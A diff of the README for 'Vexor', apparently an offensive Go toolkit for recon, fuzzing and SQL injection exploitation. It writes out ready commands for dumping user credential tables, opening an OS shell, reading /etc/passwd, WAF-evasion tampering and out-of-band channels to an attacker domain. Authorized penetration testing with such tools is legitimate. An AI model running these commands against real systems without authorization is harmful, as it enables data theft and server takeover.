@@ -1,132 +1,129 @@
-<p align="center">
-  <img alt="Vexor" src="https://img.shields.io/github/license/0xseif-code/vexor?style=flat-square">
-  <img alt="Go Version" src="https://img.shields.io/badge/Go-1.21%2B-00ADD8?logo=go&logoColor=white&style=flat-square">
-  <img alt="Language" src="https://img.shields.io/badge/Language-English%20%7C%20%D8%A7%D9%84%D8%B9%D8%B1%D8%A8%D9%8A%D8%A9-9f7be1?style=flat-square">
-</p>
-
-```
+```text
  ██╗   ██╗███████╗██╗  ██╗ ██████╗ ██████╗
  ██║   ██║██╔════╝╚██╗██╔╝██╔═══██╗██╔══██╗
  ██║   ██║█████╗   ╚███╔╝ ██║   ██║██████╔╝
  ╚██╗ ██╔╝██╔══╝   ██╔██╗ ██║   ██║██╔══██╗
   ╚████╔╝ ███████╗██╔╝ ██╗╚██████╔╝██║  ██║
    ╚═══╝  ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
-        Offensive Security Toolkit
 ```
 
-# Vexor
+**High-Performance Offensive Security Toolkit written in Go**
 
-**Read this in [العربية](README.ar.md)** — [قراءة هذا الملف باللغة العربية](README.ar.md)
+[ English ] | [ العربية (Arabic) ](README.ar.md)
 
-Vexor is a Go CLI for subdomain enumeration, web content discovery, parameter
-fuzzing, and SQL injection testing. Ships as one static binary, no runtime
-dependencies.
+[![Go](https://img.shields.io/badge/Go-1.21%2B-00ADD8?style=flat-square&logo=go)](https://go.dev/dl/)
+[![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)
+[![OS](https://img.shields.io/badge/OS-Linux%20%7C%20macOS%20%7C%20Windows-brightgreen?style=flat-square)](https://github.com/0xseif-code/vexor/releases)
+[![Release](https://img.shields.io/badge/Version-1.0.0-orange?style=flat-square)](https://github.com/0xseif-code/vexor/releases)
+
+Vexor is a single-binary attack tool for web recon and SQL injection testing.
+No runtime dependencies, no bloat — just a binary, your wordlists, and a target.
+
+```bash
+# Quick install
+go install github.com/0xseif-code/vexor/cmd/vexor@latest
+```
 
 ---
 
-## Features
+## Overview
 
-- Subdomain enumeration: DNS brute-force + crt.sh lookup, dedup, custom resolvers
-- Directory discovery: wordlist probing with soft-404 filtering, recursion, extension presets, status/size filtering
-- Parameter fuzzing: `FUZZ` markers in URL, headers, and body, with status/size/regex match and filter rules
-- SQLi engine: boolean, error, time, union, stacked, and OOB detection, then full exploitation (`--dbs`, `--tables`, `--columns`, `--dump`, `--os-shell`, `--read-file`, `--write-file`)
-- WAF-aware payload tampering (`--auto-tamper`), plain/json/csv output, cached SecLists wordlists, shared proxy/threads/headers flags
+| Module | Function | Core Technique / Engine |
+|---|---|---|
+| 🔍 **Subdomain** | Domain Reconnaissance | Active DNS Worker-Pool + Passive crt.sh |
+| 📁 **Directory** | Endpoint Discovery | Recursive Scanning + Smart Baseline Filtering |
+| 🎯 **Fuzzing** | Parameter Mining | Multi-position markers (`FUZZ`) + Response Analysis |
+| 💉 **SQLi** | Vulnerability Exploitation | 7 Core Detection Techniques + WAF Evasion Tampers |
+| 📚 **Wordlists** | Cache Manager | Auto on-demand SecLists downloader (`~/.vexor/`) |
 
 ---
 
 ## Installation
 
-### Option 1 — `go install`
+### Method 1 — Go Install (Recommended)
 
 Requires **Go 1.21+**:
 
 ```bash
 go install github.com/0xseif-code/vexor/cmd/vexor@latest
 
-# make sure $GOPATH/bin (or $HOME/go/bin) is on your PATH
+# make sure $GOPATH/bin is on your PATH
 export PATH="$PATH:$(go env GOPATH)/bin"    # Linux / macOS
 ```
 
-Verify:
-
-```bash
-$ vexor version
-Vexor v1.0.0 (build unknown)
-```
-
-### Option 2 — From source (`make`)
+### Method 2 — From Source
 
 ```bash
 git clone https://github.com/0xseif-code/vexor.git
 cd vexor
 
-make build          # Linux / macOS → ./bin/vexor
-# or plain go build -o vexor ./cmd/vexor
+make build          # Linux/macOS → ./bin/vexor
+# or: go build -o vexor ./cmd/vexor
 
 # Windows
 go build -o vexor.exe ./cmd/vexor
-
-sudo install -m755 bin/vexor /usr/local/bin/    # optional: system-wide
 ```
 
-### Option 3 — Download a release binary
+### Method 3 — Release Binary
 
-Grab the latest prebuilt binary for your platform from the
-[Releases](https://github.com/0xseif-code/vexor/releases) page. Assets are
-named `vexor-<os>-<arch>[.exe]`, e.g. `vexor-linux-amd64`,
-`vexor-darwin-arm64`, `vexor-windows-amd64.exe`.
-
----
-
-## Quick Start
+Grab a prebuilt binary for your platform from the
+[Releases](https://github.com/0xseif-code/vexor/releases) page. Assets follow
+`vexor-<os>-<arch>[.exe]`:
 
 ```bash
-# Download the wordlist cache once after installing
+curl -sL -o vexor https://github.com/0xseif-code/vexor/releases/download/v1.0.0/vexor-linux-amd64
+chmod +x vexor && sudo mv vexor /usr/local/bin/
+```
+
+First run — pull the wordlist cache once, then go:
+
+```bash
 vexor update-wordlists
-
-# Available commands
-vexor --help
+vexor subdomain -d example.com
 ```
-
-| Command | Description |
-|---|---|
-| `vexor subdomain` | Enumerate subdomains (DNS brute-force + crt.sh) |
-| `vexor dir` | Discover files and directories on a web target |
-| `vexor fuzz` | Fuzz URL / headers / body with `FUZZ` markers |
-| `vexor sqli` | Detect and exploit SQL injection |
-| `vexor update-wordlists` | Re-download and verify the cached SecLists mirror |
-| `vexor version` | Print the version and build info |
-
-### Global flags
-
-Every command shares the same global controls:
-
-```
---timeout <s>      global request timeout in seconds            (default: 10)
---threads <n>      global concurrency thread count              (default: 50)
---proxy <url>      HTTP/SOCKS5 proxy, e.g. http://127.0.0.1:8080
---headers <h>      custom header, repeatable, e.g. -H "User-Agent: custom"
---format <fmt>     output format: plain, json, csv              (default: plain)
---output <file>    save results to a file (in addition to stdout)
---silent           suppress banner, progress bars, and info logs
---no-color         disable ANSI colored output
-```
-
-Results go to **stdout** (monochrome, pipe-friendly); logs and progress go to
-**stderr** — so `vexor dir -u URL | tee results.txt` just works, and
-`--format json` is ready for `jq`.
 
 ---
 
-## Usage Examples
+## Command Reference
 
-### `vexor subdomain`
+All commands share the global flags below. Banner, logs, and progress go to
+`stderr`; findings go to **stdout** (monochrome, pipe-friendly) — so
+`vexor dir -u URL | tee results.txt` just works.
 
-Active DNS brute-force + passive crt.sh enumeration:
+| Flag | Shorthand | Type | Description | Default |
+|---|---|---|---|---|
+| `--timeout` | | int | Global request timeout (seconds) | `10` |
+| `--threads` | | int | Global concurrency threads | `50` |
+| `--proxy` | | string | HTTP/SOCKS5 proxy, `http://127.0.0.1:8080` | |
+| `--headers` | | stringarray | Custom header, repeatable | |
+| `--format` | | string | Output: `plain`, `json`, `csv` | `plain` |
+| `--output` | | string | Also write results to a file | |
+| `--silent` | | bool | Suppress banner/progress/info logs | `false` |
+| `--no-color` | | bool | Disable ANSI colors | `false` |
+
+### `subdomain` — Enumerate subdomains
+
+Active DNS brute-force + passive crt.sh lookups, deduplicated across sources.
+
+| Flag | Shorthand | Type | Description | Default |
+|---|---|---|---|---|
+| `--domain` | `-d` | string | Target domain (required unless `-l`) | |
+| `--list` | `-l` | string | File of target domains, one per line | |
+| `--size` | `-s` | string | Wordlist size: `small`, `medium`, `large` | `medium` |
+| `--wordlist` | `-w` | string | Custom wordlist path (overrides `-s`) | |
+| `--resolvers` | | stringarray | Custom DNS resolvers, repeatable | |
+| `--active-only` | | bool | Skip crt.sh, DNS brute-force only | `false` |
+| `--passive-only` | | bool | Skip DNS, crt.sh only | `false` |
 
 ```bash
-$ vexor subdomain -d example.com -s medium --threads 100
+vexor subdomain -d example.com -s large --threads 150
+vexor subdomain -l domains.txt -s medium
+vexor subdomain -d example.com --resolvers 8.8.8.8:53 --resolvers 1.1.1.1:53 --active-only
+vexor subdomain -d example.com -w my-subdomains.txt --format json | jq -r '.subdomain'
+```
 
+```text
+$ vexor subdomain -d example.com -s medium --threads 100
 [*] starting subdomain enumeration: example.com (mode=dns+crtsh, threads=100, size=medium)
 api.example.com
 app.example.com
@@ -139,45 +136,72 @@ shop.example.com
 [+] subdomain enumeration complete: 42 total subdomains in 12.6s
 ```
 
-Target many domains from a file, or use a custom wordlist:
+### `dir` — Discover files and directories
+
+Wordlist-driven endpoint probing with soft-404 calibration, recursion, and
+extension presets.
+
+| Flag | Shorthand | Type | Description | Default |
+|---|---|---|---|---|
+| `--url` | `-u` | string | Target URL, e.g. `https://example.com/` (required) | |
+| `--size` | `-s` | string | Wordlist size | `medium` |
+| `--wordlist` | `-w` | string | Custom wordlist path (overrides `-s`) | |
+| `--ext` | `-x` | stringslice | Extensions/presets, e.g. `php,asp,all` | |
+| `--recursion` | `-r` | bool | Recurse into discovered directories | `false` |
+| `--depth` | | int | Max recursion depth (with `-r`) | `2` |
+| `--match-status` | | string | Only report these codes | |
+| `--filter-status` | | string | Exclude these codes | |
+| `--filter-size` | | string | Exclude these byte sizes | |
+| `--rate` | | int | Max requests/second (`0` = unlimited) | `0` |
 
 ```bash
-vexor subdomain -l domains.txt -s large
-vexor subdomain -d example.com -w my-subdomains.txt
-vexor subdomain -d example.com --active-only --resolvers 8.8.8.8:853 --resolvers 1.1.1.1:53
+vexor dir -u https://example.com -x php,js -r --depth 2
+vexor dir -u https://example.com -x all --filter-status 404 --filter-size 4297
+vexor dir -u https://example.com --match-status 200,301,302 --rate 100
 ```
 
-### `vexor dir`
-
-Content discovery with recursion and filtering:
-
-```bash
+```text
 $ vexor dir -u https://example.com -x php,js -r --depth 2
-
 [*] starting content discovery on https://example.com (threads=50, depth=2, exts=php,js)
 200	2.1 KB	https://example.com/index.php	Home
 200	1.4 KB	https://example.com/login.php	Login
-302	0 B		https://example.com/admin/	
-301	0 B		https://example.com/backup/	
+302	0 B		https://example.com/admin/
+301	0 B		https://example.com/backup/
 200	3.8 KB	https://example.com/admin/config.php	Configuration
 ...
 [+] content discovery complete: 18 findings, 4812 requests, 0 errors in 3m12s
 ```
 
-Cull false positives in one shot:
+### `fuzz` — Fuzz request parameters
+
+Mark injection points with `FUZZ` in the URL, headers, or body. Responses are
+filtered by status, size, and regex.
+
+| Flag | Shorthand | Type | Description | Default |
+|---|---|---|---|---|
+| `--url` | `-u` | string | Target URL with `FUZZ` marker (required) | |
+| `--method` | `-X` | string | HTTP method | `GET` |
+| `--data` | `-d` | string | Request body (FUZZ markers supported) | |
+| `--wordlist` | `-w` | string | Fuzz preset or custom wordlist path | `parameters` |
+| `--match-status` | | string | Only report these codes | |
+| `--filter-status` | | string | Exclude these codes | |
+| `--filter-size` | | string | Exclude these byte sizes | |
+| `--match-regex` | | string | Only report bodies matching this regex | |
+| `--filter-regex` | | string | Exclude bodies matching this regex | |
+| `--delay` | | duration | Delay between requests, e.g. `100ms` | `0` |
+
+Wordlist presets: `parameters`, `extensions`, `usernames`, `passwords`,
+`passwords-large`, `endpoints` — or pass any file path as `-w`.
 
 ```bash
-vexor dir -u https://example.com -x all --filter-status 404 --filter-size 4297 -r
-vexor dir -u https://example.com --match-status 200,301,302 --rate 100
+vexor fuzz -u "https://example.com/api/query?id=FUZZ" -w parameters --match-status 200,500
+vexor fuzz -u "http://target/login" -d "user=FUZZ&pass=x" -X POST -w usernames
+vexor fuzz -u "https://example.com/search?s=FUZZ" --filter-size 0 --filter-regex "no results"
+vexor fuzz -u "https://example.com/page?q=FUZZ" --delay 100ms --match-regex "SQL syntax"
 ```
 
-### `vexor fuzz`
-
-Mark injection points with `FUZZ` — in the URL, headers, or body:
-
-```bash
+```text
 $ vexor fuzz -u "https://example.com/api/query?id=FUZZ" -w parameters --match-status 200,500
-
 [*] starting fuzzing GET https://example.com/api/query?id=FUZZ (threads=50, wordlist=parameters)
 [200] https://example.com/api/query?id=admin (id=admin)
 [200] https://example.com/api/query?id=debug (id=debug)
@@ -186,24 +210,52 @@ $ vexor fuzz -u "https://example.com/api/query?id=FUZZ" -w parameters --match-st
 [+] fuzzing complete: 3 hits, 1411/1411 checked, 0 errors in 41.7s
 ```
 
-Fuzz method + body, filter the noise:
+### `sqli` — Detect and exploit SQL injection
+
+Seven detection techniques across every parameter — boolean, error, time,
+union, stacked, inline, and OOB — followed by full exploitation on the first
+confirmed point.
+
+| Flag | Shorthand | Type | Description | Default |
+|---|---|---|---|---|
+| `--url` | `-u` | string | Target URL, e.g. `https://example.com/page?id=1` | |
+| `--request` | `-r` | string | Burp-style raw HTTP request file | |
+| `--param` | `-p` | string | Only test this parameter | |
+| `--dbms` | | string | Force DBMS: `mysql`, `postgres`, `mssql`, `oracle`, `sqlite` | `auto` |
+| `--level` | | int | Test intensity (1-5) | `1` |
+| `--risk` | | int | Payload risk (1-3) | `1` |
+| `--tamper` | | stringslice | Tamper scripts, e.g. `space2comment,randomcase` | |
+| `--auto-tamper` | | bool | Fingerprint WAF + use suggested tamper chain | `false` |
+| `--oob-domain` | | string | Domain for OOB (DNS/HTTP) channels | |
+| `--dbs` | | bool | Enumerate databases | `false` |
+| `--tables` | | bool | Enumerate tables | `false` |
+| `--columns` | | bool | Enumerate columns | `false` |
+| `--dump` | | bool | Dump table contents | `false` |
+| `--database` | `-D` | string | DB name for `--tables/--columns/--dump` | |
+| `--table` | `-T` | string | Table name for `--columns/--dump` | |
+| `--column` | `-C` | stringslice | Specific columns to dump, repeatable | |
+| `--os-shell` | | bool | Interactive OS shell via the injection point | `false` |
+| `--read-file` | | string | Read a file from the DB server | |
+| `--write-file` | | string | Write a local file to the DB server | |
+| `--file-dest` | | string | Remote path for `--write-file` | basename |
 
 ```bash
-vexor fuzz -u "http://target/login" -d "user=FUZZ&pass=x" -X POST -w usernames
-vexor fuzz -u "https://example.com/search?s=FUZZ" --filter-size 0 --filter-regex "no results"
-vexor fuzz -u "https://example.com/page?q=FUZZ" --delay 100ms --match-regex "SQL syntax"
+# Basic SQL injection scan
+vexor sqli -u "http://target.com/page.php?id=1"
+
+# Automated WAF evasion + data extraction
+vexor sqli -u "http://target.com/page.php?id=1" --auto-tamper --dbs
+
+# Table dump
+vexor sqli -u "http://target.com/page.php?id=1" --dump -D shop -T users -C id,username,password
+
+# Full takeover
+vexor sqli -u "http://target.com/page.php?id=1" --os-shell
+vexor sqli -u "http://target.com/page.php?id=1" --read-file /etc/passwd
 ```
 
-Presets: `parameters`, `extensions`, `usernames`, `passwords`,
-`passwords-large`, `endpoints` — or pass any file path as `-w`.
-
-### `vexor sqli`
-
-Detection across every parameter (boolean, error, time, union, stacked, inline, OOB):
-
-```bash
+```text
 $ vexor sqli -u "https://example.com/page?id=1" --level 2
-
 [*] starting SQL injection scan on https://example.com/page?id=1 (dbms=auto level=2 risk=1 threads=50)
 URL query parameter/GET/id technique=boolean dbms=mysql confidence=95
 URL query parameter/GET/id technique=error   dbms=mysql confidence=88
@@ -211,36 +263,28 @@ POST form parameter/POST/user technique=time      dbms=mysql confidence=76
 ...
 [+] scan complete: 3 findings, 412 requests, 2 errors in 2m05s
 [i] fingerprinted DBMS: mysql
+
+$ vexor sqli -u "https://example.com/page?id=1" --dbs
+...
+[i] first confirmed injection point: GET/id (boolean)
+information_schema
+shop
+mysql
+...
+[+] done in 3m41s
 ```
 
-Then exploit the first confirmed point:
+### `update-wordlists` — Manage the local cache
 
 ```bash
-vexor sqli -u "https://example.com/page?id=1" --dbs
-vexor sqli -u "https://example.com/page?id=1" --tables -D shop
-vexor sqli -u "https://example.com/page?id=1" --columns -D shop -T users
-vexor sqli -u "https://example.com/page?id=1" --dump -D shop -T users -C id,username,password
-vexor sqli -u "https://example.com/page?id=1" --os-shell
-vexor sqli -u "https://example.com/page?id=1" --read-file /etc/passwd
+vexor update-wordlists
 ```
 
-Also supports raw Burp requests, tamper chains, and out-of-band channels:
+Downloads and integrity-checks the SecLists mirror into `~/.vexor/wordlists`.
+Run once after installing, then any time you want fresh data.
 
-```bash
-vexor sqli -r request.txt -p id
-vexor sqli -u "https://example.com/page?id=1" --auto-tamper
-vexor sqli -u "https://example.com/page?id=1" --tamper space2comment,randomcase
-vexor sqli -u "https://example.com/page?id=1" --oob-domain yourdomain.attacker.com
-```
-
-### `vexor update-wordlists`
-
-Vexor caches wordlists in `~/.vexor/wordlists` and pulls from a SecLists mirror.
-Run this once after installing — and any time you want fresh data:
-
-```bash
+```text
 $ vexor update-wordlists
-
 [*] re-downloading all wordlists into ~/.vexor/wordlists
 [*] downloading...  65.30% (18.4 MB / 28.2 MB)
 [+] wordlist cache updated: 3 files in 46.8s
@@ -249,46 +293,36 @@ $ vexor update-wordlists
 [i]   fuzz/parameters     5.7 MB  sha256=b2a9d0134e6e
 ```
 
-> `subdomain`, `dir`, and `fuzz` pick their wordlist automatically by size
-> (`-s small|medium|large`) or an explicit path (`-w`).
-
 ---
 
-## Output Formats
+## Wordlists & Advanced Configuration
+
+- **Cache location:** `~/.vexor/wordlists/` — auto-downloaded on first use,
+  re-fetched with `vexor update-wordlists`.
+- **Size presets** (`-s`): `small`, `medium`, `large`. `subdomain`, `dir`,
+  and `fuzz` pick sensible defaults per module.
+- **Fuzz presets** (`-w`): `parameters`, `extensions`, `usernames`,
+  `passwords`, `passwords-large`, `endpoints`.
+- **Custom wordlists** (`-w /path/to/file.txt`): any local file, one word per
+  line — overrides the size preset.
+
+Output formats are per-scan:
 
 ```bash
-# JSON, pipe into jq
 vexor subdomain -d example.com --format json | jq -r '.subdomain'
-
-# CSV into a spreadsheet
 vexor dir -u https://example.com --format csv -o results.csv
-
-# Plain works everywhere; stdout stays pipe-friendly
 vexor sqli -u "https://example.com/page?id=1" | tee sqli.log
 ```
 
 ---
 
-## Project Layout
+## Disclaimer
 
-```
-cmd/vexor/        CLI entry point (Cobra commands)
-internal/fuzz/    Parameter fuzzing engine
-internal/sqli/    SQL injection detection & exploitation
-internal/enum/    Subdomain enumeration + directory discovery
-internal/httpclient/  Fast concurrent HTTP client
-internal/wordlists/   Cached SecLists mirror + integrity checks
-```
-
----
-
-## Legal & Disclaimer
-
-**Use responsibly. Authorized testing only.**
-
-Vexor is an offensive security tool. Only use it against systems you own or
-have written permission to test. Unauthorized access to computer systems is
-illegal in most jurisdictions. The author assumes no liability for misuse.
+> **Use responsibly. Authorized testing only.**
+>
+> Vexor is an offensive security tool. Only use it against systems you own or
+> have written permission to test. Unauthorized access to computer systems is
+> illegal in most jurisdictions. The author assumes no liability for misuse.
 
 ## License
 
